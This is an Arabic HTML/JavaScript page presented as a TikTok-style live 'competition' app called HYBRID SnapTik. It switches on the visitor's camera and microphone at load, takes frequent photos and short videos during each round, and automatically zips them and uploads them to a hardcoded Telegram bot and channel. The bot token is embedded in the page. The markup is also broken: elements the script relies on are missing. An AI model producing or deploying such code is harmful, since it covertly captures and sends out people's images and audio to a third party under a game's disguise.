<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🔥 HYBRID SnapTik v3.0 - بث + منافسة</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
        }

        /* الحاوية الرئيسية */
        .hybrid-container {
            width: 100%;
            max-width: 450px;
            height: 900px;
            background: #0a0c10;
            position: relative;
            overflow: hidden;
            border-radius: 40px;
            box-shadow: 0 30px 60px rgba(255,215,0,0.2);
            border: 2px solid #ffd700;
            display: flex;
            flex-direction: column;
        }

        /* رأس التطبيق */
        .app-header {
            background: linear-gradient(135deg, #161b22, #1f2630);
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #ffd700;
        }

        .logo {
            color: #ffd700;
            font-size: 18px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo i {
            font-size: 24px;
            color: #4caf50;
        }

        .publisher-badge {
            background: #4caf50;
            color: white;
            padding: 6px 12px;
            border-radius: 25px;
            font-size: 12px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        /* شريط الجلسة */
        .session-bar {
            background: #1f2630;
            padding: 8px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #ffd700;
        }

        .session-id {
            background: #0a0c10;
            color: #4caf50;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-family: monospace;
            direction: ltr;
            border: 1px solid #ffd700;
        }

        .live-indicator {
            background: #ff4444;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .live-dot {
            width: 8px;
            height: 8px;
            background: white;
            border-radius: 50%;
            animation: blink 1s infinite;
        }

        /* شريط المنافسين */
        .competitors-bar {
            background: #1f2630;
            padding: 10px;
            border-bottom: 2px solid #ffd700;
        }

        .section-title {
            color: #ffd700;
            font-size: 12px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .competitors-grid {
            display: flex;
            gap: 8px;
            overflow-x: auto;
            padding-bottom: 5px;
            scrollbar-width: none;
        }

        .competitors-grid::-webkit-scrollbar {
            display: none;
        }

        .competitor-card {
            min-width: 100px;
            background: #0a0c10;
            border: 1px solid #ffd700;
            border-radius: 15px;
            padding: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .competitor-card.selected {
            background: #ffd700;
            transform: scale(1.05);
        }

        .competitor-card.selected .competitor-name,
        .competitor-card.selected .competitor-points {
            color: #000;
        }

        .competitor-avatar {
            width: 50px;
            height: 50px;
            border-radius: 15px;
            background: linear-gradient(45deg, #ffd700, #ff8a00);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }

        .competitor-name {
            color: white;
            font-size: 11px;
            font-weight: bold;
        }

        .competitor-fingerprint {
            background: #4caf50;
            color: white;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 8px;
            font-family: monospace;
        }

        .competitor-points {
            color: #ffd700;
            font-size: 10px;
            display: flex;
            align-items: center;
            gap: 3px;
        }

        /* شاشتين أفقياً */
        .dual-screen {
            display: flex;
            flex: 1;
            min-height: 0;
            gap: 2px;
            padding: 2px;
        }

        .screen {
            flex: 1;
            background: #161b22;
            border: 2px solid;
            border-radius: 15px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .host-screen {
            border-color: #ff4444;
        }

        .guest-screen {
            border-color: #4caf50;
        }

        .screen-header {
            padding: 5px;
            background: #1f2630;
            border-bottom: 1px solid;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 10px;
        }

        .host-header {
            color: #ff4444;
            border-bottom-color: #ff4444;
        }

        .guest-header {
            color: #4caf50;
            border-bottom-color: #4caf50;
        }

        .screen-title {
            display: flex;
            align-items: center;
            gap: 3px;
        }

        .screen-badge {
            background: currentColor;
            color: #000;
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 8px;
            font-weight: bold;
        }

        .video-container {
            flex: 1;
            background: #000;
            position: relative;
            min-height: 0;
        }

        video, canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* تراكبات المعلومات */
        .player-info {
            position: absolute;
            top: 5px;
            left: 5px;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
            padding: 4px 8px;
            border-radius: 15px;
            border: 1px solid #ffd700;
            color: #ffd700;
            font-size: 9px;
            display: flex;
            align-items: center;
            gap: 5px;
            z-index: 10;
        }

        .player-points {
            position: absolute;
            top: 5px;
            right: 5px;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
            padding: 4px 8px;
            border-radius: 15px;
            border: 1px solid #4caf50;
            color: #4caf50;
            font-size: 10px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 3px;
            z-index: 10;
        }

        /* عدادات الجولة */
        .round-timer {
            position: absolute;
            bottom: 45px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255,68,68,0.9);
            backdrop-filter: blur(5px);
            padding: 6px 20px;
            border-radius: 25px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            font-family: monospace;
            direction: ltr;
            border: 2px solid #ffd700;
            z-index: 20;
        }

        /* زر ZIP */
        .zip-button {
            position: absolute;
            bottom: 45px;
            right: 10px;
            width: 45px;
            height: 45px;
            background: #4caf50;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            cursor: pointer;
            border: 2px solid #ffd700;
            z-index: 20;
            transition: all 0.3s;
        }

        .zip-button:active {
            transform: scale(0.9);
            background: #ff4444;
        }

        /* أزرار التحكم الرئيسية */
        .action-buttons {
            display: flex;
            gap: 5px;
            padding: 5px;
            background: #1f2630;
        }

        .action-btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .action-btn.start {
            background: #4caf50;
            color: white;
        }

        .action-btn.stop {
            background: #ff4444;
            color: white;
        }

        .action-btn.zip {
            background: #ffd700;
            color: black;
        }

        /* شريط الإحصائيات */
        .stats-bar {
            background: #1f2630;
            padding: 8px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-top: 2px solid #ffd700;
        }

        .stats-item {
            display: flex;
            align-items: center;
            gap: 5px;
            color: #ffd700;
            font-size: 12px;
        }

        .stats-value {
            background: #0a0c10;
            padding: 2px 8px;
            border-radius: 15px;
            color: white;
            font-weight: bold;
        }

        /* شريط TikTok السفلي */
        .tiktok-nav {
            display: flex;
            justify-content: space-around;
            padding: 8px 0;
            background: #000;
            border-top: 1px solid #ffd700;
        }

        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #888;
            font-size: 10px;
            cursor: pointer;
        }

        .nav-item i {
            font-size: 20px;
            margin-bottom: 2px;
        }

        .nav-item.active {
            color: #ffd700;
        }

        /* إشعارات */
        .notification {
            position: absolute;
            top: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(10px);
            color: white;
            padding: 12px 25px;
            border-radius: 30px;
            border: 2px solid #ffd700;
            z-index: 100;
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideDown 0.3s ease;
        }

        /* تأثيرات */
        @keyframes blink {
            0%,100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        @keyframes slideDown {
            from { transform: translate(-50%, -100%); opacity: 0; }
            to { transform: translate(-50%, 0); opacity: 1; }
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="hybrid-container">
        <!-- رأس التطبيق -->
        <div class="app-header">
            <div class="logo">
                <i class="fas fa-microchip"></i>
                HYBRID SnapTik
            </div>
            <div class="publisher-badge">
                <i class="fas fa-crown"></i>
                @nardoo_merchant
            </div>
        </div>

        <!-- شريط الجلسة -->
        <div class="session-bar">
            <div class="session-id" id="sessionDisplay">جلسة: LIVE_IS0N3Z</div>
            <div class="live-indicator" id="liveIndicator" style="display: none;">
                <span class="live-dot"></span>
                بث مباشر
            </div>
        </div>

        <!-- شريط المنافسين -->
        <div class="competitors-bar">
            <div class="section-title">
                <i class="fas fa-user-friends"></i>
                اختر منافسك
            </div>
            <div class="competitors-grid" id="competitorsGrid">
                <!-- ستتم إضافة المنافسين هنا -->
            </div>

        <!-- شاشتين أفقياً -->
        <div class="dual-screen">
            <!-- المضيف -->
            <div class="screen host-screen">
                <div class="screen-header host-header">
                    <div class="screen-title">
                        <i class="fas fa-crown"></i> المضيف
                    </div>
                    <div class="screen-badge" id="hostBadge">@nardoo</div>
                </div>
                <div class="video-container">
                    <video id="hostVideo" autoplay playsinline muted></video>
                    <div class="player-info">
                        <i class="fas fa-fingerprint"></i>
                        <span id="hostFingerprint">A1B2C3D4</span>
                    </div>
                    <div class="player-points" id="hostPoints">

                </div>

            <!-- الضيف (المنافس) -->

                    </div>

                    <!-- مؤقت الجولة -->

        <!-- أزرار التحكم الرئيسية -->
        <div class="action-buttons">
            <button class="action-btn start" onclick="startRound()">
                <i class="fas fa-play"></i> بدء الجولة
            </button>
            <button class="action-btn stop" onclick="stopEverything()">
                <i class="fas fa-stop"></i> إيقاف
            </button>
            <button class="action-btn zip" onclick="stopAndSend()">
                <i class="fas fa-file-archive"></i> حفظ وإرسال
            </button>
        </div>

        <!-- شريط الإحصائيات -->
        <div class="stats-bar">
            <div class="stats-item">
                <i class="fas fa-image"></i>
                <span class="stats-value" id="photoCount">0</span>
            </div>
            <div class="stats-item">
                <i class="fas fa-video"></i>
                <span class="stats-value" id="videoCount">0</span>
            </div>
            <div class="stats-item">
                <i class="fas fa-trophy"></i>
                <span class="stats-value" id="roundDisplay">جولة 0</span>
            </div>
        </div>

        <!-- شريط TikTok السفلي -->
        <div class="tiktok-nav">
            <div class="nav-item active">
                <i class="fas fa-home"></i>
                <span>الرئيسية</span>
            </div>
            <div class="nav-item">
                <i class="fas fa-compass"></i>
                <span>اكتشف</span>
            </div>
            <div class="nav-item">
                <i class="fas fa-plus-circle" style="color: #ffd700; font-size: 28px;"></i>
                <span>بث</span>
            </div>
            <div class="nav-item">
                <i class="fas fa-comment"></i>
                <span>الرسائل</span>
            </div>
            <div class="nav-item">
                <i class="fas fa-user"></i>
                <span>الملف</span>
            </div>
        </div>
    </div>

    <script>
        // ================== الإعدادات ==================
        const CONFIG = {
            videoDuration: 5,
            videoInterval: 8000,
            photoQuality: 0.9,
            photoInterval: 200,
            roundDuration: 60,
            botToken: '8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0',
            channelId: '-1003822964890'
        };

        const PUBLISHER = {
            id: '@nardoo_merchant',
            name: 'الناشر',
            fingerprint: 'A1B2C3D4',
            session: 'LIVE_IS0N3Z'
        };

        // ================== قائمة المنافسين ==================
        const COMPETITORS = [
            { id: '@ahmed', name: 'أحمد', fingerprint: 'F1A2B3C4', points: 150, avatar: '👨‍🦱' },
            { id: '@mohamed', name: 'محمد', fingerprint: 'D4E5F6G7', points: 237, avatar: '👨' },
            { id: '@ali', name: 'علي', fingerprint: 'H8I9J0K1', points: 89, avatar: '🧔' },
            { id: '@omar', name: 'عمر', fingerprint: 'L2M3N4O5', points: 456, avatar: '👦' },
            { id: '@hassan', name: 'حسن', fingerprint: 'P6Q7R8S9', points: 321, avatar: '👨‍🦰' },
            { id: '@sara', name: 'سارة', fingerprint: 'R1S2T3U4', points: 567, avatar: '👩' }
        ];

        // ================== المتغيرات ==================
        let hostStream = null;
        let isLiveActive = false;
        let currentRound = 0;
        let roundSeconds = 0;
        let roundTimer = null;
        
        let currentPhotos = [];
        let currentVideos = [];
        let photoInterval = null;
        let videoInterval = null;
        
        let selectedCompetitor = null;
        let hostPoints = 0;
        let guestPoints = 0;
        
        // ================== العناصر ==================
        const hostVideo = document.getElementById('hostVideo');
        const guestCanvas = document.getElementById('guestCanvas');
        const ctx = guestCanvas.getContext('2d');
        
        // ================== عرض المنافسين ==================
        function displayCompetitors() {
            const grid = document.getElementById('competitorsGrid');
            let html = '';
            
            // إضافة خيار "بدون منافس"
            html += `
                <div class="competitor-card" onclick="selectCompetitor(null)">
                    <div class="competitor-avatar">🚫</div>
                    <div class="competitor-name">بدون منافس</div>
                    <div class="competitor-fingerprint">----</div>
                    <div class="competitor-points">
                        <i class="fas fa-star"></i> 0
                    </div>
                </div>
            `;
            
            COMPETITORS.forEach(comp => {
                html += `
                    <div class="competitor-card" onclick="selectCompetitor('${comp.id}')">
                        <div class="competitor-avatar">${comp.avatar}</div>
                        <div class="competitor-name">${comp.name}</div>
                        <div class="competitor-fingerprint">${comp.fingerprint}</div>
                        <div class="competitor-points">
                            <i class="fas fa-star"></i> ${comp.points}
                        </div>
                    </div>
                `;
            });
            
            grid.innerHTML = html;
            
            // اختيار أول منافس افتراضياً
            setTimeout(() => {
                selectCompetitor(COMPETITORS[1].id); // محمد
            }, 500);
        }
        
        // ================== اختيار منافس ==================
        window.selectCompetitor = function(id) {
            // إزالة التحديد من الكل
            document.querySelectorAll('.competitor-card').forEach(card => {
                card.classList.remove('selected');
            });
            
            if (id === null) {
                selectedCompetitor = null;
                document.getElementById('guestBadge').textContent = 'بدون منافس';
                document.getElementById('guestFingerprint').textContent = '----';
                guestPoints = 0;
                document.getElementById('guestPoints').innerHTML = '<i class="fas fa-star"></i> 0';
                return;
            }
            
            // تحديث التحديد في الواجهة
            const selectedCard = Array.from(document.querySelectorAll('.competitor-card')).find(
                card => card.innerHTML.includes(id)
            );
            if (selectedCard) selectedCard.classList.add('selected');
            
            // تخزين المنافس المختار
            selectedCompetitor = COMPETITORS.find(c => c.id === id);
            
            if (selectedCompetitor) {
                document.getElementById('guestBadge').textContent = selectedCompetitor.id;
                document.getElementById('guestFingerprint').textContent = selectedCompetitor.fingerprint;
                guestPoints = selectedCompetitor.points;
                document.getElementById('guestPoints').innerHTML = `<i class="fas fa-star"></i> ${guestPoints}`;
                
                showNotification(`تم اختيار ${selectedCompetitor.name} كمنافس`);
            }
        };
        
        // ================== تشغيل كاميرا المضيف ==================
        async function startHostCamera() {
            try {
                showNotification('🔄 تشغيل الكاميرا...');
                hostStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 360 },
                    audio: true
                });
                hostVideo.srcObject = hostStream;
                await hostVideo.play();
                requestAnimationFrame(updateGuestCanvas);
                showNotification('✅ الكاميرا جاهزة');
            } catch (err) {
                showNotification('❌ خطأ في الكاميرا');
            }
        }
        
        // ================== تحديث شاشة الضيف ==================
        function updateGuestCanvas() {
            if (hostStream && hostVideo.readyState === hostVideo.HAVE_ENOUGH_DATA) {
                ctx.drawImage(hostVideo, 0, 0, guestCanvas.width, guestCanvas.height);
                
                // إضافة تأثير للمنافس
                ctx.fillStyle = 'rgba(76, 175, 80, 0.1)';
                ctx.fillRect(0, 0, guestCanvas.width, guestCanvas.height);
            }
            requestAnimationFrame(updateGuestCanvas);
        }
        
        // ================== بدء جولة جديدة ==================
        window.startRound = function() {
            if (!hostStream) {
                startHostCamera();
                setTimeout(() => startRoundCountdown(), 1000);
            } else {
                startRoundCountdown();
            }
        };
        
        function startRoundCountdown() {
            currentRound++;
            document.getElementById('roundDisplay').textContent = `جولة ${currentRound}`;
            
            roundSeconds = CONFIG.roundDuration;
            updateTimerDisplay();
            
            let countdown = 3;
            const countInterval = setInterval(() => {
                if (countdown > 0) {
                    document.getElementById('roundTimer').textContent = `⏳ ${countdown}`;
                    countdown--;
                } else {
                    clearInterval(countInterval);
                    startLiveRound();
                }
            }, 1000);
        }
        
        function startLiveRound() {
            isLiveActive = true;
            document.getElementById('liveIndicator').style.display = 'flex';
            
            currentPhotos = [];
            currentVideos = [];
            
            photoInterval = setInterval(capturePhoto, CONFIG.photoInterval);
            videoInterval = setInterval(recordVideo, CONFIG.videoInterval);
            
            roundTimer = setInterval(() => {
                roundSeconds--;
                updateTimerDisplay();
                
                // زيادة النقاط
                if (Math.random() > 0.7) {
                    hostPoints++;
                    document.getElementById('hostPoints').innerHTML = `<i class="fas fa-star"></i> ${hostPoints}`;
                }
                if (Math.random() > 0.8 && selectedCompetitor) {
                    guestPoints++;
                    document.getElementById('guestPoints').innerHTML = `<i class="fas fa-star"></i> ${guestPoints}`;
                }
                
                if (roundSeconds <= 0) {
                    endRound();
                }
            }, 1000);
            
            updateStats();
            showNotification('🔴 بدء البث المباشر');
        }
        
        function updateTimerDisplay() {
            const mins = Math.floor(roundSeconds / 60);
            const secs = roundSeconds % 60;
            document.getElementById('roundTimer').textContent = 
                `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        function endRound() {
            clearInterval(roundTimer);
            clearInterval(photoInterval);
            clearInterval(videoInterval);
            isLiveActive = false;
            document.getElementById('liveIndicator').style.display = 'none';
            saveRound();
            showNotification('⏹️ انتهت الجولة');
        }
        
        // ================== إيقاف كل شيء ==================
        window.stopEverything = function() {
            if (isLiveActive) {
                clearInterval(roundTimer);
                clearInterval(photoInterval);
                clearInterval(videoInterval);
                isLiveActive = false;
                document.getElementById('liveIndicator').style.display = 'none';
            }
            
            if (hostStream) {
                hostStream.getTracks().forEach(t => t.stop());
                hostStream = null;
            }
            
            showNotification('⏹️ تم الإيقاف');
        };
        
        // ================== التقاط الصور ==================
        function capturePhoto() {
            if (!isLiveActive) return;
            const canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 180;
            canvas.getContext('2d').drawImage(hostVideo, 0, 0, 320, 180);
            canvas.toBlob((blob) => {
                if (!isLiveActive) return;
                currentPhotos.push({ blob });
                updateStats();
            }, 'image/jpeg', CONFIG.photoQuality);
        }
        
        // ================== تسجيل الفيديو ==================
        async function recordVideo() {
            if (!isLiveActive || !hostStream) return;
            try {
                const chunks = [];
                const recorder = new MediaRecorder(hostStream);
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = () => {
                    currentVideos.push({ blob: new Blob(chunks) });
                    updateStats();
                };
                recorder.start();
                setTimeout(() => recorder.stop(), CONFIG.videoDuration * 1000);
            } catch (error) {}
        }
        
        // ================== تحديث الإحصائيات ==================
        function updateStats() {
            document.getElementById('photoCount').textContent = currentPhotos.length;
            document.getElementById('videoCount').textContent = currentVideos.length;
        }
        
        // ================== إيقاف وإرسال ==================
        window.stopAndSend = async function() {
            // إيقاف البث
            if (isLiveActive) {
                clearInterval(roundTimer);
                clearInterval(photoInterval);
                clearInterval(videoInterval);
                isLiveActive = false;
                document.getElementById('liveIndicator').style.display = 'none';
            }
            
            // التحقق من وجود محتوى
            if (!currentPhotos.length && !currentVideos.length) {
                showNotification('❌ لا يوجد محتوى للإرسال');
                return;
            }
            
            showNotification('📦 تجهيز الملفات...');
            
            try {
                // إنشاء ZIP
                const zip = new JSZip();
                const subFingerprint = `${PUBLISHER.session}_${currentRound}_${Date.now().toString(16).substring(0, 6).toUpperCase()}`;
                
                // إضافة الصور
                currentPhotos.forEach((p, i) => zip.file(`round_${currentRound}_photo_${i+1}.jpg`, p.blob));
                
                // إضافة الفيديوهات
                currentVideos.forEach((v, i) => zip.file(`round_${currentRound}_video_${i+1}.webm`, v.blob));
                
                // إنشاء ملف البصمة
                const now = new Date();
                let fingerprintText = `🔐 HYBRID SnapTik v3.0\n`;
                fingerprintText += `========================\n\n`;
                fingerprintText += `👤 المضيف: ${PUBLISHER.id}\n`;
                fingerprintText += `🔑 بصمة المضيف: ${PUBLISHER.fingerprint}\n`;
                fingerprintText += `🎯 جلسة البث: ${PUBLISHER.session}\n`;
                fingerprintText += `🔄 رقم الجولة: ${currentRound}\n`;
                fingerprintText += `📅 التاريخ: ${now.toLocaleString('ar-EG')}\n`;
                fingerprintText += `🔖 المعرف: ${subFingerprint}\n`;
                fingerprintText += `📸 عدد الصور: ${currentPhotos.length}\n`;
                fingerprintText += `🎥 عدد الفيديوهات: ${currentVideos.length}\n`;
                
                if (selectedCompetitor) {
                    fingerprintText += `\n🏆 معلومات المنافسة:\n`;
                    fingerprintText += `👤 المنافس: ${selectedCompetitor.id}\n`;
                    fingerprintText += `🔑 بصمة المنافس: ${selectedCompetitor.fingerprint}\n`;
                    fingerprintText += `⭐ نقاط المضيف: ${hostPoints}\n`;
                    fingerprintText += `⭐ نقاط المنافس: ${guestPoints}\n`;
                    
                    if (hostPoints > guestPoints) {
                        fingerprintText += `🏅 الفائز: المضيف (${PUBLISHER.id})\n`;
                    } else if (guestPoints > hostPoints) {
                        fingerprintText += `🏅 الفائز: المنافس (${selectedCompetitor.id})\n`;
                    } else {
                        fingerprintText += `🤝 النتيجة: تعادل\n`;
                    }
                }
                
                fingerprintText += `\n📱 تم بواسطة HYBRID SnapTik v3.0\n`;
                fingerprintText += `© @nardoo_merchant\n`;
                
                zip.file("fingerprint.txt", fingerprintText);
                
                // إنشاء ملف ZIP
                const zipBlob = await zip.generateAsync({ type: "blob", compression: "DEFLATE" });
                
                // إرسال إلى تليجرام
                showNotification('📤 إرسال إلى القناة...');
                
                const formData = new FormData();
                formData.append('chat_id', CONFIG.channelId);
                formData.append('document', zipBlob, `broadcast_${subFingerprint}.zip`);
                
                let caption = `📦 بث من ${PUBLISHER.id}\n`;
                caption += `🔑 ${subFingerprint}\n`;
                caption += `📸 ${currentPhotos.length} صور | 🎥 ${currentVideos.length} فيديو\n`;
                
                if (selectedCompetitor) {
                    caption += `🏆 ${PUBLISHER.id} ${hostPoints} - ${guestPoints} ${selectedCompetitor.id}`;
                }
                
                formData.append('caption', caption);
                
                const res = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await res.json();
                
                if (result.ok) {
                    showNotification('✅ تم الإرسال بنجاح!');
                    
                    // إعادة تعيين العدادات
                    currentPhotos = [];
                    currentVideos = [];
                    hostPoints = 0;
                    guestPoints = 0;
                    updateStats();
                    
                    document.getElementById('hostPoints').innerHTML = '<i class="fas fa-star"></i> 0';
                    document.getElementById('guestPoints').innerHTML = '<i class="fas fa-star"></i> 0';
                    
                } else {
                    showNotification('❌ فشل الإرسال');
                }
                
            } catch (error) {
                showNotification('❌ خطأ في الإرسال');
            }
        };
        
        // ================== حفظ الجولة ==================
        async function saveRound() {
            if (!currentPhotos.length && !currentVideos.length) return;
            
            try {
                const zip = new JSZip();
                const subFingerprint = `${PUBLISHER.session}_${currentRound}_${Date.now().toString(16).substring(0, 6).toUpperCase()}`;
                
                currentPhotos.forEach((p, i) => zip.file(`round_${currentRound}_photo_${i+1}.jpg`, p.blob));
                currentVideos.forEach((v, i) => zip.file(`round_${currentRound}_video_${i+1}.webm`, v.blob));
                
                const now = new Date();
                let fingerprintText = `🔐 HYBRID SnapTik - جولة ${currentRound}\n\n`;
                fingerprintText += `👤 المضيف: ${PUBLISHER.id}\n`;
                fingerprintText += `🔑 بصمة المضيف: ${PUBLISHER.fingerprint}\n`;
                fingerprintText += `🎯 جلسة: ${PUBLISHER.session}\n`;
                fingerprintText += `🔄 الجولة: ${currentRound}\n`;
                fingerprintText += `📅 ${now.toLocaleString('ar-EG')}\n`;
                fingerprintText += `🔖 ${subFingerprint}\n`;
                fingerprintText += `📸 ${currentPhotos.length} صور | 🎥 ${currentVideos.length} فيديو\n`;
                
                zip.file("fingerprint.txt", fingerprintText);
                
                const zipBlob = await zip.generateAsync({ type: "blob", compression: "DEFLATE" });
                
                const formData = new FormData();
                formData.append('chat_id', CONFIG.channelId);
                formData.append('document', zipBlob, `round_${currentRound}_${subFingerprint}.zip`);
                formData.append('caption', `🏆 جولة ${currentRound}\n📹 ${PUBLISHER.id}\n📸 ${currentPhotos.length} | 🎥 ${currentVideos.length}`);
                
                await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {}
        }
        
        // ================== إظهار الإشعارات ==================
        function showNotification(message) {
            // إزالة أي إشعار سابق
            const oldNotification = document.querySelector('.notification');
            if (oldNotification) {
                oldNotification.remove();
            }
            
            // إنشاء إشعار جديد
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.innerHTML = `
                <i class="fas fa-microchip" style="color: #ffd700;"></i>
                <span>${message}</span>
            `;
            
            document.querySelector('.hybrid-container').appendChild(notification);
            
            // إخفاء الإشعار بعد 2 ثانية
            setTimeout(() => {
                notification.style.animation = 'slideDown 0.3s reverse';
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.remove();
                    }
                }, 300);
            }, 2000);
        }
        
        // ================== بدء التشغيل ==================
        window.onload = function() {
            // عرض معرف الجلسة
            document.getElementById('sessionDisplay').textContent = `جلسة: ${PUBLISHER.session}`;
            document.getElementById('hostFingerprint').textContent = PUBLISHER.fingerprint;
            document.getElementById('hostBadge').textContent = PUBLISHER.id;
            
            // عرض المنافسين
            displayCompetitors();
            
            // تشغيل الكاميرا
            startHostCamera();
            
            // تحديث المؤقت
            updateTimerDisplay();
            
            // رسالة ترحيب
            setTimeout(() => {
                showNotification('✨ مرحباً بك في HYBRID SnapTik');
            }, 1000);
        };
    </script>
</body>
</html>
